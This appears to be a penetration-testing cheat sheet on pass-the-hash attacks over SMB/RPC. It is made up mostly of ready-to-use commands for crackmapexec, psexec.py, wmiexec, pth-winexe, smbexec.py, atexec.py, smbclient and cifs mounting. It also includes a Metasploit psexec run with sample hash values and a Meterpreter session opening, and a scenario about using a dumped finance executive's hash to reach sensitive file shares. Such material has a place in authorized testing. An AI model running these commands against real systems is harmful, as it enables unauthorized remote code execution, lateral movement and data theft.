# SMB/RPC (PTH)

### Validate hash with crackmapexec

```bash
crackmapexec <IP> -u <USER> -H <HASH> --local # Local accounts
crackmapexec <IP> -u <USER> -H <HASH> -d <DOMAIN> # Domain accounts
```

### SMB/RPC (Pass The Hash)

{% tabs %}
{% tab title="psexec.py" %}
```bash
psexec.py <USER>:@<IP/COMPUTER> -hashes <NTLM HASH>
psexec.py '<DOMAIN>\<USER>:@<IP/COMPUTER>' -hashes <NTLM HASH>
```
{% endtab %}

{% tab title="wmiexec.py" %}
Requires SMB (445) and RPC (135):

```bash
wmiexec <DOMAIN>/<USERNAME>%<HASH>@<IP/COMPUTER>
wmiexec <USERNAME>@<IP/COMPUTER> -hashes <NTLM HASH>
wmiexec <DOMAIN>/<USERNAME>@<IP/COMPUTER> -hashes :<NTHASH>
```
{% endtab %}

{% tab title="pth-winexe" %}
```bash
pth-winexe -U <DOMAIN>/<USERNAME>%<HASH> //<IP/COMPUTER> cmd.exe # <HASH> = LM:NT
pth-winexe --system -U <DOMAIN>/<USERNAME>%<HASH> //<IP/COMPUTER> cmd.exe
pth-winexe -U WORKGROUP/<USERNAME>%<HASH> //<IP/COMPUTER> cmd.exe # Local
```
{% endtab %}

{% tab title="smbexec.py" %}
```bash
smbexec.py <DOMAIN>/<USER>@<IP/COMPUTER> -hashes :<NTHASH>
```
{% endtab %}

{% tab title="atexec.py" %}
Execute commands via the Task Scheduler (using `\pipe\atsvc` via SMB):

```bash
atexec.py -hashes <LM:NT> <USERNAME>@<IP/COMPUTER> "whoami"
```
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="Metasploit (psexec module)" %}
```bash
msf > use exploit/windows/smb/psexec
msf exploit(psexec) > set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
SMBPass => e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
msf exploit(psexec) > exploit
[*] Sending stage (719360 bytes)
[*] Meterpreter session 1 opened (192.168.57.133:443 -> 192.168.57.131:1045)
```
{% endtab %}

{% tab title="smbclient" %}
Often you may not have administrative access to a system, despite having recovered valid hashes. Consider the following scenario: You have compromised a single host and have dumped hashes. One of the hashes belongs to the head of finance. He has no administrative access to the infrastructure, but he has access to lots of sensitive data on the file server. smbclient has a `-pw-nt-hash` flag that you can use to pass an NT Hash.

```bash
smbclient //<IP>/<SHARED> -U <USER> --pw-nt-hash <HASH> -W <DOMAIN>
smbclient //<IP>/<SHARED> -U '<USER>&<NT HASH>' --pw-nt-hash
```
{% endtab %}

{% tab title="mount" %}
On Linux a Windows share can be mounted to a particular mount point in the local directory tree using the cifs mount type within the mount tool.

Although we can pass the hash using `smbclient`, its FTP-like interface can be limiting. It is often much more useful to mount a share, that way you can interact with it through the Linux command line or through a GUI file explorer. For a greater user experience, you can even expose this mount point with SSHFS, so you can browse the share from the comfort of your local Windows or Mac file explorer.

When mounting a share you cannot pass the hash, but you can connect with a Kerberos ticket (which you can get by passing the hash! → LINK TO: get Ticket). Use a command similar to the following to mount a share. If it fails with the error "No such file or directory" it usually means that your ticket is not where it is expected to be or that permissions do not allow the mount to see it.

```bash
mount -t cifs -o sec=krb5,vers=3.0 '//SERVER.DOMAIN.LOCAL/SHARE' /mnt/share
```
{% endtab %}
{% endtabs %}
